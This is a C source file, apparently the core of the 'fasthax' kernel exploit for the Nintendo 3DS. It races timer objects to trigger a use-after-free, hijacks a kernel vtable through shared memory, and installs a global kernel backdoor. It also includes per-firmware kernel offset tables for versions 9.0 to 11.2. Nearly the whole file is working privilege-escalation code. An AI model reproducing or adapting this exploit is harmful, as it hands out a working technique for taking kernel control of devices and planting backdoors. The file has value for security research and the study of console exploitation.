/* Exploit-related code. Ned Williamson 2016 */
#include <3ds.h>
#include <string.h>
#include <stdio.h>
#include "backdoor.h"
#include "exploit.h"
#include "timer.h"
#include "util.h"

extern void *handle_lookup_kern;
extern void *RandomStub;
extern u32 **svc_handler_table_writable;
extern void *svc_7b_free_area;
extern void *svc_7b_free_area_writable;

#define TIMER2_NEXT_KERNEL 0xe281100c

static u32 fptrs[16] = {
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
};

#define LINEAR_KERN_TO_USER(addr) ((addr) - 0xE0000000 + 0x14000000)
/* need to use null or other procs run through the alloc list and segfault
 * alternative: try this with a userspace obj with NULL next pointer so we
 * can match against it specifically
 */
#define FAKE_NEXT_POINTER 0x80808080

/* is this valid across versions? */
#define KTIMER_POOL_HEAD 0xFFF33278
#define KTIMER_BASE 0xFFF70000 + 0x4E20
#define KTIMER_OBJECT_SIZE 0x3C
#define KTIMER_POOL_SIZE 0xE10
#define KTIMER_END (KTIMER_BASE + KTIMER_POOL_SIZE)
#define NUM_TIMER_OBJECTS (KTIMER_POOL_SIZE / KTIMER_OBJECT_SIZE)

/* if the UAF succeeded, setup mybackdoor */
static bool try_setup_global_backdoor() {
  Handle timer, timer2;
  Result res;

  u32 *timer2_next_user = (u32 *)LINEAR_KERN_TO_USER(TIMER2_NEXT_KERNEL);

  //u8 backup[KTIMER_OBJECT_SIZE];

  /* backup old heap data */
  //memcpy(backup, timer2_next_user, KTIMER_OBJECT_SIZE);

  *timer2_next_user = FAKE_NEXT_POINTER;

  res = svcCreateTimer(&timer, PULSE_EVENT);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer1\n");
    return false;
  }

  res = svcCreateTimer(&timer2, PULSE_EVENT);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u32 current_value = *(vu32 *)timer2_next_user;

  /* if nothing changed, then we didn't win the race */
  if (current_value == FAKE_NEXT_POINTER) {
    res = svcCloseHandle(timer2);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
    }

    res = svcCloseHandle(timer);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer\n");
    }

    return false;
  }

  printf("we won!\n");
  wait_for_user();

  /* we won the race! replace vtable with our own */
  *timer2_next_user = (u32)&fptrs;

  /* this installs the backdoor */
  svcCancelTimer(timer2);

  /* put vtable back so we can free normally */
  *timer2_next_user = current_value;

  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
  }

  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer\n");
  }

  /* restore old heap data */
  //memcpy(timer2_next_user, backup, KTIMER_OBJECT_SIZE);

  return true;
}

/* TODO upper bound is 11.1+ only */
#define IS_VTABLE(addr) (0xFFF2E000 <= (addr) && (addr) < 0xFFF2F000)

static bool cleanup_uaf() {
  /* TODO: this entire function is TOCTTOU of kernel free list state */
  /* at this point the kernel timer free list contains a userspace item.
   * we need to fix that.
   */

  /* scan through list to find bad free pointer to FAKE_NEXT_POINTER,
   * and the abandoned freed item. then restore the pointer.
   */
  u32 *next_pointers[NUM_TIMER_OBJECTS] = { 0 };

  /* patch the broken timer to point to the abandoned node */
  u32 *ktimer_head = (u32 *)kreadint_real((u32 *)KTIMER_POOL_HEAD);
  u32 *broken = NULL;

  u32 i = 0;

  /* TODO(ned) account for the object on the user heap? */
  if (ktimer_head == (u32 *)FAKE_NEXT_POINTER) {
    //printf("ktimer head is the broken link\n");
    broken = (u32 *)KTIMER_POOL_HEAD;
  } else {
    /* ktimer head is not the broken link, check the heap itself */
    for (void *current = (void *)KTIMER_BASE; current < (void *)KTIMER_END; current += KTIMER_OBJECT_SIZE, i++) {
      u32 current_value = kreadint_real(current);
      //printf("%ld: checking current_value = 0x%lx ->", i, current_value);
      if (IS_VTABLE(current_value)) {
        //printf("marked next pointer as NULL due to code\n");
        next_pointers[i] = NULL; // use null for allocated ones
      } else {
        /* first NULL is the broken one */
        if (current_value == FAKE_NEXT_POINTER && !broken) {
          //printf("found broken, ");
          broken = current;
        }
        //printf("found freed pointer\n");
        next_pointers[i] = (u32 *)current_value;
      }
      //wait_for_user();
    }
  }

  if (i != NUM_TIMER_OBJECTS) {
    printf("[!] Unexpected number of iterations over timer object list.\n");
    printf("[!] Got %lu, expected %u.\n", i, NUM_TIMER_OBJECTS);
    return false;
  }

  if (!broken) {
    printf("[-] Couldn't find broken link to cleanup after UAF.\n");
    printf("[-] This shouldn't be possible.\n");
    return false;
  }

  /* this is n^2 but it's 60 objects. who wants to write a hash table for that? lol */
  u32 *missing = NULL;
  for (i = 0; i < NUM_TIMER_OBJECTS; i++) {
    bool found = false;
    u32 *ktimers = (u32 *)KTIMER_BASE;
    u32 *to_find = &ktimers[i];
    /* head of list is not missing */
    if (to_find == ktimer_head) {
      continue;
    }
    for (u32 j = 0; j < NUM_TIMER_OBJECTS; j++) {
      if (next_pointers[j] == to_find) {
        found = true;
        break;
      }
    }
    if (!found) {
      missing = to_find;
      break;
    }
  }

  /* TODO: we should be able to do some other recovery here */
  if (!missing) {
    printf("[-] Couldn't find missing node to restore after UAF.\n");
    printf("[-] This shouldn't be possible.\n");
    return false;
  }

  kwriteint_real(broken, (u32)missing);
  printf("0x%lx <- 0x%lx\n", (u32)broken, (u32)missing);

  return true;
}

static bool initialize_timer_state() {
  Result res;
  Handle timer;

  /* alloced: timer1 */
  res = svcCreateTimer(&timer, 0);
  if (res < 0) {
    printf("failed to create timer1\n");
    return false;
  }

  /* alloced: timer1, timer2 */
  Handle timer2;
  res = svcCreateTimer(&timer2, 2);
  if (res < 0) {
    printf("failed to create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u64 timeout = 0x100000000 | (u32)RandomStub;
  u32 carry = timeout % 3;
  timeout /= 3;
  svcCancelTimer(timer2);

  if (!set_timer(timer2, 0xaaa00000, 0)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  if (!set_timer(timer2, (u32)timeout, carry)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  if (mybackdoor_installed()) {
    u64 initial = 0;
    if (!get_timer_value(timer2, &initial, NULL)) {
      printf("set_timer_test: get_timer_value failed\n");
      svcCloseHandle(timer2);
      svcCloseHandle(timer);
      return false;
    }

    u32 target = (u32)((initial) >> 32);
    if (target != (u32)(void*)RandomStub) {
      printf("warning: got bad target: %lx\n", target);
      printf("returning early for debug purposes\n");
      return false;
    } else {
      printf("got good target!\n");
    }
    wait_for_user();
  }

  /* alloced: timer1 */
  /* freed: timer2 -> ... */
  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }

  /* freed: timer1 -> timer2 -> ... */
  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }
  return true;
}

/* returns true if attempt succeeded */
/* call this after initialize_state */
static void try_once() {
  Handle timer;
  /* each round, we allocate timer1, run the pulse timer,
   * then free it. if it frees while pulsing a UAF occurs
   * and we have &timer2 where &timer1->vtable should be.
   * so we get a vtable call where the fields from timer2
   * were controlled
   *
   * then we get (timer2+0x3c)(timer2, ...)
   * so return to any kernel function that writes an error to R0
   * 0xE....... which is R/W shared with userspace 0x2.......
   * this gives us *timer2 = userspace_addr;
   * and the timer object free list is timer1 -> timer2 -> ...
   * so we need to alloc two times to get timer2, then we should
   * be able to overwrite its vtable as we please using the shared
   * memory
   */

  svcCreateTimer(&timer, PULSE_EVENT);
  // set timer with a quick first pulse, long second pulse
  // 6000 found using random trial and error. there might be
  // a better value
  svcSetTimer(timer, 8000, 0x1000000000);
  // hope the pulse race happens
  svcCloseHandle(timer);
  svcSleepThread(1000000);

  /* reallocate the freed timer and clear it from the scheduler */
  svcCreateTimer(&timer, PULSE_EVENT);
  svcCancelTimer(timer);
  svcCloseHandle(timer);
}

typedef struct version_table {
  u32 kver;
  u32 handle_lookup;
  u32 random_stub;
  u32 svc_handler_table;
  u32 free_area;
} version_table;

// New 3DS
static version_table n_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF18D5C, 0xFFF1B1A4, 0xFFF02300, 0xFFF2CA2C},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF18AFC, 0xFFF1B188, 0xFFF02310, 0xFFF2CF94},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF18AF0, 0xFFF1B17C, 0xFFF0230C, 0xFFF2CF88},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF18B18, 0xFFF1B1A4, 0xFFF02308, 0xFFF2CFCC},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2CFA4},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2CFA4},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2CFD0},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18CD4, 0xFFF1B5FC, 0xFFF0230C, 0xFFF2D710},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18CD4, 0xFFF1B63C, 0xFFF0230C, 0xFFF2D7D0},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18CF4, 0xFFF1B65C, 0xFFF0230C, 0xFFF2D7F0},  // 11.2
  {0},
};

// Old 3DS
static version_table o_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF184C0, 0xFFF1A830, 0xFFF02330, 0xFFF2B82C},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF185C0, 0xFFF1AB50, 0xFFF0232C, 0xFFF2BD68},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF185B4, 0xFFF1AB44, 0xFFF02328, 0xFFF2BD5C},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF185DC, 0xFFF1AB6C, 0xFFF02324, 0xFFF2BDA0},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2BD6C},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2BD6C},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2BD98},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18A80, 0xFFF1B2AC, 0xFFF02328, 0xFFF2C514},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18A80, 0xFFF1B2EC, 0xFFF02328, 0xFFF2C5D4},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18AA0, 0xFFF1B30C, 0xFFF02328, 0xFFF2C5F4},  // 11.2
  {0},
};

/*
3dbrew 11.1 mapping
[L1 ] VA 1f300000..1f400000 -> PA 1f300000..1f400000 [  X ] [ Priv: RW, User: -- ]
[L1 ] VA d8000000..d8600000 -> PA 18000000..18600000 [ XN ] [ Priv: RW, User: -- ]
[L1 ] VA df000000..df400000 -> PA 1f000000..1f400000 [ XN ] [ Priv: RW, User: -- ]
[L1 ] VA dff00000..e0000000 -> PA 1ff00000..20000000 [ XN ] [ Priv: RW, User: -- ]
[L1 ] VA e0000000..f0000000 -> PA 20000000..30000000 [ XN ] [ Priv: RW, User: -- ]
 ...
[L2L] VA fff00000..fff20000 -> PA 1ff80000..1ffa0000 [  X ] [ Priv: R-, User: -- ]
[L2S] VA fff20000..fff2e000 -> PA 1ffde000..1ffec000 [  X ] [ Priv: R-, User: -- ]
[L2S] VA fff2e000..fff2f000 -> PA 1ffec000..1ffed000 [ XN ] [ Priv: R-, User: -- ]
*/

/* TODO: 11.1+ only. make it work on <11.1 */
/*
static u32 kernel_va_to_pa(u32 addr) {
  if (0xfff00000 <= addr && addr < 0xfff20000) {
    return addr - 0xfff00000 + 0x1ff80000;
  } else if (0xfff20000 <= addr && addr < 0xfff2e000) {
    return addr - 0xfff20000 + 0x1ffde000;
  } else if (0xfff2e000 <= addr && addr < 0xfff2f000) {
    return addr - 0xfff2e000 + 0x1ffec000;
  }
  return 0;
}

static u32 kernel_pa_to_writable(u32 addr) {
  return 0;
}

static u32 kernel_va_to_writable(u32 addr) {
  u32 pa = kernel_va_to_pa(addr);
  return kernel_pa_to_writable(pa);
}
*/

static bool initialize_handle_address() {
  u32 kver = osGetKernelVersion();
  bool n3ds = false;
  APT_CheckNew3DS(&n3ds);

  version_table *table = n3ds ? n_table : o_table;

  while (table->kver) {
    if (table->kver == kver) {
      handle_lookup_kern = (void *)table->handle_lookup;
      RandomStub = (void *)table->random_stub;
      u32 svc_handler_table_pa = table->svc_handler_table - 0xfff00000 + 0x1ff80000;
      svc_handler_table_writable = (void *)(svc_handler_table_pa - 0x1ff00000 + 0xdff00000);
//      svc_7b_free_area = (void *)table->free_area;
//      /* hardcode 11.1+ for now */
//      u32 svc_7b_free_area_pa = table->free_area - 0xfff20000 + 0x1ffde000;
//      svc_7b_free_area_writable = (void *)(svc_7b_free_area_pa - 0x1ff00000 + 0xdff00000);
      return true;
    }
    table = table + 1;
  }
  return false;
}

static bool try_uaf(u32 attempts) {
  for (u32 i = 0; i < attempts; i++) {
    if ((i % 0x100) == 0) {
      printf("beginning attempt 0x%lx\n", i);
    }
    try_once();
    if (try_setup_global_backdoor()) {
      return true;
    }
  }
  return false;
}

#define NUM_ATTEMPTS 0x10000

bool k11_exploit() {
  if (!initialize_handle_address()) {
    printf("[-] Unsupported kernel version.\n");
    return false;
  }
  printf("[+] Initialized kernel-specific offsets.\n");

  if (!initialize_timer_state()) {
    printf("[-] Couldn't initialize timer state.\n");
    return false;
  }
  printf("[+] Initialized timer state.\n");

  if (!try_uaf(NUM_ATTEMPTS)) {
    printf("[!] Couldn't trigger UAF within %x iterations.\n", NUM_ATTEMPTS);
    printf("[*] It is safe to rerun fasthax to try again.\n");
    return false;
  }

  if (!global_backdoor_installed()) {
    printf("[-] UAF reported success but backdoor not installed!\n");
    return false;
  }
  printf("[+] UAF succeeded and local backdoor installed.\n");

  /* global backdoor is installed using code from this process
   * We need to restore svcBackdoor code into the kernel now so we
   * can call this SVC from any process.
   */

  u32 kver = osGetKernelVersion();
  if (kver >= SYSTEM_VERSION(2, 51, 0)) {
    printf("[-] Search free buffer area.\n");
    if (!search_free_area()) {
      printf("[-] Couldn't find free buffer area.\n");
      return false;
    }
    printf("[+] Found free buffer area.\n");
    // for debug
    printf("    %08lX %08lX\n", (u32)svc_7b_free_area, (u32)svc_7b_free_area_writable);
    wait_for_user();
  }

  if (!finalize_global_backdoor()) {
    printf("[-] Couldn't finalize global backdoor.\n");
    printf("[-] We won't be able to run kernel code in other processes.\n");
    return false;
  }

  if (!cleanup_uaf()) {
    printf("[-] Warning! Exploit succeeded couldn't cleanup kernel.\n");
    printf("[-] System instability may occur.\n");
    return false;
  }

  return true;
}
